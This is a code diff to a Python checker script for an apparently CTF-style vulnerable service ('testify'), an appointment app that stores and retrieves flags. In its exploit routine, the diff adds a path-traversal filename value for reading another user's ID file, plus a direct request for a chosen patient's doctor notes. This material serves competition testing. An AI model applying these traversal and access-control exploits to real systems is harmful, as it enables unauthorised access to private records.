@@ -5,8 +5,6 @@ import base64, faker, logging, random, re, secrets, string, time
 from enochecker import BaseChecker, BrokenServiceException, EnoException, run
 from enochecker.utils import assert_in
 
-from bs4 import BeautifulSoup
-
 logging.getLogger('faker').setLevel(logging.ERROR)
 
 
@@ -27,7 +25,7 @@ def get_profile():
         'date': profile['birthdate'].strftime('%Y-%m-%d'),
         'time': fake.time(pattern='%H:%M'),
         'file': fake.text(),
-        'filename': "badge.png",
+        'filename': "info.txt",
         'pin': get_random_string(30)
     }
 
@@ -121,16 +119,20 @@ class testifyChecker(BaseChecker):
         if self.variant_id == 0:
             profile = get_profile()
             self.register(profile['username'], profile['password'])
-            appointment_id = self.make_appointment(self.flag,
-                profile['lastname'], profile['filename'], profile['date'], profile['time'],
-                profile['file'], 'doctor0' + str(random.randint(1, 5)), profile['pin'])
 
-            # store in db
+            file_content = "First Name: {}\nLast Name: {}\nID: {}\n"
+            file_content = file_content.format(profile["prename"], profile["lastname"], self.flag)
+
+            appointment_id = self.make_appointment(profile['prename'],
+                profile['lastname'], profile['filename'], profile['date'], profile['time'],
+                file_content, 'doctor0' + str(random.randint(1, 5)), profile['pin'])
+
             self.chain_db = {
                 "profile": profile,
                 "app_id": appointment_id
             }
-            self.debug('successfully made appointment %s' % appointment_id)
+
+            return f"I heard {profile['username']} is not even human!"
 
         elif self.variant_id == 1:
             profile = get_profile()
@@ -139,46 +141,46 @@ class testifyChecker(BaseChecker):
                 profile['filename'], profile['date'], profile['time'], profile['file'],
                 'doctor0' + str(random.randint(1, 5)), profile['pin'], self.flag)
 
-            # store in db
             self.chain_db = {
                 "profile": profile,
                 "app_id": appointment_id
             }
-            self.debug('successfully made appointment %s' % appointment_id)
+
+            return f"I heard {profile['username']} smells of rust!"
 
         else:
             raise EnoException("Wrong variant_id provided")
 
     def getflag(self):  # type: () -> None
         if self.variant_id == 0:
-            # First we check if the previous putflag succeeded!
-            try:
-                profile = self.chain_db["profile"]
-            except Exception as ex:
-                self.debug(f"error getting profile from db: {ex}")
-                raise BrokenServiceException("Previous putflag failed.")
-
-            # Let's login to the service
-            session_id = self.login(profile['username'], profile['password'])
-            resp = self.get_appointment(session_id)
-
-            assert_in(self.flag, resp.text, "Resulting flag was found to be incorrect")
-        elif self.variant_id == 1:
-            # First we check if the previous putflag succeeded!
             try:
                 profile = self.chain_db["profile"]
                 app_id = self.chain_db["app_id"]
             except Exception as ex:
                 self.debug(f"error getting profile from db: {ex}")
                 raise BrokenServiceException("Previous putflag failed.")
+
+            self.login(profile['username'], profile['password'])
+            resp = self.http_get('/get_id' + str(app_id))
+
+            assert_in(self.flag, resp.text, "Faild to retrieve flag")
+        elif self.variant_id == 1:
+            try:
+                profile = self.chain_db["profile"]
+                app_id = self.chain_db["app_id"]
+            except Exception as ex:
+                self.debug(f"error getting profile from db: {ex}")
+                raise BrokenServiceException("Previous putflag failed.")
+
             kwargs = {
                 'data': {'app_id': app_id, 'pin': profile['pin']},
                 'allow_redirects': True
             }
+
             res = self.http_post('/appointment_info', **kwargs)
             if res.text.find('Your message') == -1:
-                raise BrokenServiceException("could not retrieve appointment info")
-            assert_in(self.flag, res.text, "Resulting flag was found to be incorrect")
+                raise BrokenServiceException("Could not retrieve appointment info")
+            assert_in(self.flag, res.text, "Failed to retrieve flag")
         else:
             raise EnoException("Wrong variant_id provided")
 
@@ -189,7 +191,8 @@ class testifyChecker(BaseChecker):
             password = profile['password']
             self.register(username, password)
             app_id = self.make_appointment(profile['prename'], profile['lastname'], profile['filename'],
-                                           profile['date'], profile['time'], profile['file'], 'doctor0' + str(random.randint(1, 5)), profile['pin'])
+                    profile['date'], profile['time'], profile['file'],
+                    'doctor0' + str(random.randint(1, 5)), profile['pin'])
 
             self.chain_db = {
                 'profile': profile,
@@ -294,10 +297,30 @@ class testifyChecker(BaseChecker):
         if self.variant_id > 1:
             raise EnoException("Wrong variant_id provided")
         elif self.variant_id == 0:
+            if not self.attack_info:
+                raise EnoException("No attack info available")
+            target = self.attack_info.split()[2]
 
-            raise BrokenServiceException("Resulting flag was found to be incorrect")
+            profile = get_profile()
+            username = profile['username']
+            password = profile['password']
+
+            self.register(username, password)
+
+            app_id = self.make_appointment(profile['prename'], profile['lastname'], f"..{target}-info.txt",
+                    profile['date'], profile['time'], profile['file'], username, profile['pin'])
+
+            resp = self.http_get('/get_id' + str(app_id))
+            if flag := self.search_flag(resp.text):
+                return flag
+
+            raise BrokenServiceException("Could not find flag in id file")
 
         elif self.variant_id == 1:
+            if not self.attack_info:
+                raise EnoException("No attack info available")
+            target = self.attack_info.split()[2]
+
             profile = get_profile()
             username = profile['username']
             password = profile['password']
@@ -307,21 +330,13 @@ class testifyChecker(BaseChecker):
             app_id = self.make_appointment(profile['prename'], profile['lastname'], profile['filename'], profile['date'],
                     profile['time'], profile['file'], username, profile['pin'])
 
-            text = self.http_get('/about').text
-            soup = BeautifulSoup(text, "html.parser")
-            users = soup.select_one("#onlineUsers > div").text.strip().split("  -  ")
-            for u in users:
-                kwargs = {
-                    'data': { 'patient_username': u },
-                    'allow_redirects': True
-                }
-                resp = self.http_post('/doctors', **kwargs).text
-                if flag := self.search_flag(resp):
-                    return flag
+            resp = self.http_post('/doctors', data={'patient_username': target}, allow_redirects=True).text
+            if flag := self.search_flag(resp):
+                return flag
 
             raise BrokenServiceException('Could not find flag in doctor note')
 
 
-app = testifyChecker.service  # This can be used for uswgi.
+app = testifyChecker.service
 if __name__ == "__main__":
     run(testifyChecker)
